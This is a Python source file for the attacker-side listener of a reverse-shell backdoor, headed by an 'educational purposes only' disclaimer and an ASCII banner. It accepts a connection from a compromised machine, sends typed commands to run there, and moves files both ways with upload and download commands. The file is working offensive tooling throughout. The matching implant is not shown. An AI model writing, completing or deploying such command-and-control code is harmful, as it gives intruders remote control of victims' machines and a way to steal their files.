#!/usr/bin/env python

"""

Note: The Python backdoor code provided here is intended for educational purposes only. 
It should only be used in controlled environments for the purpose of learning about network security and penetration testing. 
Any unauthorized use of this code is strictly prohibited and may result in legal consequences. 
Use at your own risk.

"""

print("""
██╗░░░░░██╗░██████╗████████╗███████╗███╗░░██╗███████╗██████╗░
██║░░░░░██║██╔════╝╚══██╔══╝██╔════╝████╗░██║██╔════╝██╔══██╗
██║░░░░░██║╚█████╗░░░░██║░░░█████╗░░██╔██╗██║█████╗░░██████╔╝
██║░░░░░██║░╚═══██╗░░░██║░░░██╔══╝░░██║╚████║██╔══╝░░██╔══██╗
███████╗██║██████╔╝░░░██║░░░███████╗██║░╚███║███████╗██║░░██║
╚══════╝╚═╝╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝""" )
# Importing the necessary modules
import socket
import json
import base64

# Defining the Listener class
# Listener class for establishing a connection and receiving and executing commands from the remote server
class Listener:
   # Initialize the listener by creating a socket and waiting for incoming connections
    def __init__(self, ip, port):
        # Create a socket and set the reuse address option to true
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Bind the socket to the specified IP and port
        listener.bind((ip, port))
        # Start listening for incoming connections, allowing a maximum of 0 connections in the queue
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        # Accept an incoming connection and store the connection and the address of the remote server
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    # Function to send data reliably over the connection
    def reliable_send(self, data):
        # Encode the data as a JSON string
        json_data = json.dumps(data).encode()
        # Send the encoded data over the connection
        self.connection.send(json_data)

    # Function to receive data reliably over the connection
    def reliable_receive(self):
        json_data = ""
        # Continuously receive data until a complete JSON string is received
        while True:
            try:
                # Receive data in 1024 byte chunks
                json_data = json_data + self.connection.recv(1024).decode()
                # Attempt to decode the received data as a JSON object
                return json.loads(json_data)
            except ValueError:
                # If the data is not a complete JSON string, continue receiving data
                continue

    # Function to execute a command remotely on the server
    def execute_remotely(self, command):
        # Send the command to the remote server
        self.reliable_send(command)
        # If the command is "exit", close the connection and exit the program
        if command[0] == "exit":
            self.connection.close()
            exit()
        # Return the result of the command execution on the server
        return self.reliable_receive()

    # Function to read the contents of a file
    def read_file(self, path):
        with open(path, "rb") as file:
            # Read the contents of the file and encode them as a base64 string
            return base64.b64encode(file.read())

    # Function to write the contents of a file
    def write_file(self, path, content):
        with open(path, "wb") as file:
            # Decode the base64 content and write it to the file
            file.write(base64.b64decode(content))
            # Return a success message
            return "[+] Download successful."
            
    # Function to continuously receive and execute commands from the remote server
    def run(self):
        while True:
            # Prompt the user for a command
            command = input(">> ")
            # Split the command into a list of arguments
            command = command.split(" ")

            try:
                # Check if the command is "upload"
                if command[0] == "upload":
                    # If the first argument is "upload", read the content of the file specified in the second argument
                    file_content = self.read_file(command[1]).decode()
                     # Append the content of the file to the command list
                    command.append(file_content)

                # Send the command to be executed remotely
                result = self.execute_remotely(command)

            # Check if the first argument is "download" and there was no error during execution
                if command[0] == "download" and "[-] Error" not in result:
                    # If the first argument is "download" and there was no error, write the content to the specified file
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."

        # Print the result of the command execution
            print(result)

my_listener = Listener("IP-Address", "port number")
# Start the listener
my_listener.run()



